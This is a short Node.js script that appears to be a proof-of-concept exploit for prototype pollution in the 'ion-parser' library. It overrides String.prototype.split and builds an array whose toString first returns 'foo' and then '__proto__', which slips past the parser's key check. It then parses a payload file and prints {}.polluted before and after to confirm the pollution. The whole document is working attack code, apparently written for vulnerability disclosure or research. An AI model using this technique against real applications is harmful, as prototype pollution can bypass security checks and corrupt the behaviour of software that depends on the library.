var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
const fs = require('fs');
const path = require('path');
const ION = require('ion-parser');
let obj = {};
console.log({}.polluted);
ION.parse(fs.readFileSync(path.resolve(__dirname, './payload.toml'), 'utf-8'));
console.log({}.polluted);